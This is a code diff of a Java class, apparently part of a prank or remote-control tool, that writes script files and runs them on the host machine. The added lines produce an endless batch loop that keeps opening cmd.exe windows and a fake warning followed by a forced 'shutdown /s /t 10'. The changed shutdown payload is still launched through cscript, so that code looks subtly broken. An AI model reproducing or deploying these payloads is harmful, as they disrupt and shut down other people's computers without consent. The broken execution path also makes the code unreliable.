@@ -102,7 +102,7 @@ class Sockets
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
                 bw.write("@echo off" + nl +
 ":A" + nl +
-"start iexplore en.wikipedia.org/wiki/Internet_troll" + nl +
+"start cmd.exe" + nl +
 "goto:A");
                 bw.close();
                 
@@ -133,12 +133,7 @@ class Sockets
                 
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" + nl +
-"Set colCDROMs = oWMP.cdromCollection" + nl +
-"if colCDROMs.Count = 1 then" + nl +
-"for i = 0 to colCDROMS.Count - 1" + nl +
-"colCDROMs.Item(i).Eject" + nl +
-"colCDROMs.Item(i).Eject");
+                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10");
                 bw.close();
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "cscript", filePath});
